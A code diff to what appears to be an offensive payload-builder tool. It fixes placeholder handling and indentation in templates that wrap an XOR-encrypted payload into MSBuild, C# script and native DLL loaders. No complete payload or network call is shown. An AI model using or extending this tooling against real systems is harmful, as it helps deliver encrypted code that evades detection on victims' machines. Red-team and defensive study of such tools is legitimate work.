@@ -189,6 +189,9 @@ def _build_csharp(args, assembly_args, template_file, output_file,
     if args_str:
         sp = " " * indent
         template = template.replace(f"{sp}// YOURARGS", args_str)
+    else:
+        sp = " " * indent
+        template = template.replace(f"{sp}// YOURARGS\n", "")
 
     if ascii_enforce:
         template = enforce_ascii(template)
@@ -287,6 +290,8 @@ def _build_msbuild_staged(args, assembly_args):
     args_str = _csharp_args(assembly_args, indent=4)
     if args_str:
         template = template.replace("        // YOURARGS", args_str)
+    else:
+        template = template.replace("        // YOURARGS\n", "")
 
     template = enforce_ascii(template)
     with open(output_path, "w", encoding="ascii") as f:
@@ -387,7 +392,8 @@ def build_workflow(args, assembly_args):
     print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)
 
     if args.encryption == "xor":
-        template = patch_csharp_for_xor(template, indent=4, is_msbuild=False)
+        template = patch_csharp_for_xor(template, indent=4, is_msbuild=False,
+                                               body_indent=12)
         template = inject_placeholders(template, {
             '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
             '"YOURKEYHERE"': f'"{_b64(key)}"',
@@ -423,6 +429,8 @@ def build_workflow(args, assembly_args):
     args_str = _csharp_args(assembly_args, indent=8)
     if args_str:
         template = template.replace("        // YOURARGS", args_str)
+    else:
+        template = template.replace("        // YOURARGS\n", "")
 
     output_dir = args.output or OUTPUT_DIR
     os.makedirs(output_dir, exist_ok=True)
@@ -877,6 +885,8 @@ def build_csi(args, assembly_args):
     args_str = _csharp_args(assembly_args, indent=4)
     if args_str:
         template = template.replace("    // YOURARGS", args_str)
+    else:
+        template = template.replace("    // YOURARGS\n", "")
 
     output_path = args.output or os.path.join(OUTPUT_DIR, "payload_ready.csx")
     _ensure_output_dir(output_path)
@@ -1013,14 +1023,14 @@ def _build_native_dll(args, assembly_args, output_file, compile_target):
         argc = len(assembly_args) if assembly_args else 0
         template = template.replace(
             "// YOURARGS_XOR_START\n"
-            "        SAFEARRAYBOUND ab = { 0, 0 };\n"
-            "        // YOURARGS_XOR_END",
-            f"        SAFEARRAYBOUND ab = {{ {argc}, 0 }};",
+            "            SAFEARRAYBOUND ab = { 0, 0 };\n"
+            "            // YOURARGS_XOR_END",
+            f"            SAFEARRAYBOUND ab = {{ {argc}, 0 }};",
         )
         if args_put:
-            template = template.replace("        // YOURARGS_XOR_PUT", args_put)
+            template = template.replace("            // YOURARGS_XOR_PUT", args_put)
         else:
-            template = template.replace("        // YOURARGS_XOR_PUT\n", "")
+            template = template.replace("            // YOURARGS_XOR_PUT\n", "")
         template = template.replace("    // YOURARGS_START\n"
                                     "            SAFEARRAYBOUND ab = { 0, 0 };\n"
                                     "            // YOURARGS_END", "")
